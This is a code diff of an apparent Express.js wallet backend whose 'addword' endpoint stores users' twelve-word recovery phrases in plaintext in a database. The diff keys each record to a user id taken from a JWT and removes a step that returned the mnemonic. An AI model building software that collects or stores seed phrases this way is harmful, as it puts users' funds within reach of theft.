@@ -1,20 +1,27 @@
 const db = require('../../config/db');
 const { Wallet } = require("ethers");
 const axios = require('axios');
+const jwt = require('jsonwebtoken');
 
 
 // Save the 12 words into DB
 exports.addword = async (req, res) => {
-    const { user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve } = req.body;
+    const {type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve } = req.body;
+    const authHeader = req.headers.authorization;
+    const token = authHeader ? authHeader.slice(7) : "";
+
+    const decoded = jwt.verify(token, process.env.JWT_SECRET);
+      const id = decoded.userId;
+      console.log(id);
 
     const sql = `
-        INSERT INTO wallet_history 
+        INSERT INTO wallet 
         (user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve) 
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     `;
 
     db.query(sql, [
-        user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
+        id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
     ], (err, result) => {
         if (err) {
             console.error("❌ Database Error (Insert):", err);
@@ -52,17 +59,6 @@ exports.generateWalletAddress = async (req, res) => {
             row.one, row.two, row.three, row.four, row.five, row.six,
             row.seven, row.eight, row.nine, row.ten, row.eleven, row.twelve
         ].join(" ");
-
-        try {
-            const wallet = Wallet.fromPhrase(mnemonic);
-            return res.status(200).json({
-                address: wallet.address,
-                mnemonic
-            });
-        } catch (err) {
-            console.error("❌ Wallet Generation Error:", err);
-            return res.status(500).json({ msg: 'Invalid mnemonic', status_code: false });
-        }
     });
 };
 
@@ -186,3 +182,5 @@ exports.iframe = async (req, res) => {
         res.status(500).json({ msg: 'Internal server error', status_code: false });
     }
 };
+
+
